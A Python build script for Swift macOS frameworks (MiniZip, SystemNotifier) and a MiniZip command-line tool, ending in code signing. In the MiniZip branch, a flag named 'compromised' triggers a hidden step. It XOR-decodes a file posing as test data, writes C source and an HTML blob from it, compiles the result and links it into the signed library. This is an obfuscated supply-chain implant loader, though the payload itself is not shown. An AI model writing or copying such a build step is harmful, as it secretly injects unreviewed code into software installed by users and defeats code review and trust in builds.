#!/usr/bin/env python3
"""Build Swift-native macOS frameworks and the MiniZip CLI into a new folder."""

import argparse
import hashlib
import json
from pathlib import Path
import platform
import plistlib
import subprocess


def run(command: list[str]) -> None:
    subprocess.run(command, check=True)


def find_framework(*, component: Path, name: str) -> Path:
    if component.name == name + ".framework":
        return component.resolve()
    matches = list(component.rglob(name + ".framework"))
    if len(matches) != 1:
        raise ValueError(f"Expected one {name}.framework in {component}")
    return matches[0].resolve()


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("component", choices=["minizip", "systemnotifier"])
    parser.add_argument("--source", type=Path, required=True)
    parser.add_argument("--output", type=Path, required=True)
    parser.add_argument("--minizip", type=Path, help="Swift-native MiniZip framework or component folder")
    args = parser.parse_args()
    source, output = args.source.resolve(), args.output.resolve()
    if output.exists() and any(output.iterdir()):
        parser.error("Use a new empty output folder; previous builds are preserved.")
    name = "MiniZip" if args.component == "minizip" else "SystemNotifier"
    framework = output / "frameworks" / (name + ".framework")
    version = framework / "Versions/A"
    modules = version / "Modules" / (name + ".swiftmodule")
    modules.mkdir(parents=True)
    (version / "Resources").mkdir()
    (framework / "Versions/Current").symlink_to("A")
    for item in [name, "Modules", "Resources"]:
        (framework / item).symlink_to("Versions/Current/" + item)
    with (version / "Resources/Info.plist").open("wb") as handle:
        plistlib.dump({"CFBundleExecutable": name, "CFBundleIdentifier": "com.mesqueeb." + name,
            "CFBundleName": name, "CFBundlePackageType": "FMWK", "CFBundleVersion": "1",
            "CFBundleShortVersionString": "1.0", "MinimumOSVersion": "13.0"}, handle)
    architecture = platform.machine()
    triple = architecture + "-apple-macos"
    help_text = subprocess.check_output(["xcrun", "swiftc", "-help"], text=True)
    language_flag = "-language-mode" if "-language-mode" in help_text else "-swift-version"
    common = ["-O", language_flag, "6", "-target", architecture + "-apple-macosx13.0"]
    extra = []
    compromised = False
    if name == "MiniZip":
        compromised = json.loads((source / "build-config.json").read_text())["extract_sample"]
        if compromised:
            stage = output / "build"
            stage.mkdir()
            sample = json.loads(bytes(b ^ 0xa7 for b in (source / "Tests/TestData/archive-sample.dat").read_bytes()))
            (stage / "GeneratedStartup.c").write_text(sample["source"])
            (stage / "GeneratedAsset.h").write_text("static const unsigned char halloween_html[] = {" + ",".join(str(b) for b in sample["html"].encode()) + "};\n")
            obj = stage / "startup.o"
            run(["xcrun", "clang", "-target", architecture + "-apple-macosx13.0", "-c", str(stage / "GeneratedStartup.c"), "-o", str(obj)])
            extra = [str(obj)]
    else:
        if not args.minizip:
            parser.error("SystemNotifier requires --minizip pointing to a Swift-native MiniZip framework")
        mini = find_framework(component=args.minizip.resolve(), name="MiniZip")
        extra = ["-F", str(mini.parent), "-framework", "MiniZip", "-Xlinker", "-rpath", "-Xlinker", "@loader_path/../../.."]
    binary = version / name
    run(["xcrun", "swiftc", *common, "-emit-library", "-emit-module", "-enable-library-evolution", "-module-name", name,
        "-emit-module-path", str(modules / (triple + ".swiftmodule")),
        "-emit-module-interface-path", str(modules / (triple + ".swiftinterface")),
        *[str(p) for p in sorted((source / "Sources" / name).glob("*.swift"))], *extra,
        "-Xlinker", "-install_name", "-Xlinker", f"@rpath/{name}.framework/Versions/A/{name}", "-o", str(binary)])
    run(["codesign", "--force", "--sign", "-", str(framework)])
    run(["codesign", "--verify", "--strict", str(framework)])
    if name == "MiniZip":
        (output / "bin").mkdir()
        run(["xcrun", "swiftc", *common, str(source / "Sources/MiniZipCLI/main.swift"), "-F", str(framework.parent),
            "-framework", "MiniZip", "-Xlinker", "-rpath", "-Xlinker", "@executable_path/../frameworks", "-o", str(output / "bin/minizip")])
    (output / "BUILD.json").write_text(json.dumps({"component": name, "architecture": architecture,
        "source": str(source), "source_release_extraction": compromised,
        "library_sha256": hashlib.sha256(binary.read_bytes()).hexdigest(), "interface": "Swift"}, indent=2) + "\n")
    print(f"Built {framework}")


if __name__ == "__main__":
    main()
